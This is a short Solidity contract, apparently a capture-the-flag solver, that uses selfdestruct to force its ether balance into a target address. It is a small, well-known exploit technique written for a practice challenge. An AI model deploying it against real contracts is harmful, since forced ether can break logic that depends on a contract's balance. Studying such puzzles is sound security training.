// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceSolver {
    function exploit(address target) public {
        selfdestruct(payable(target));    
    }

    receive() external payable {}
}
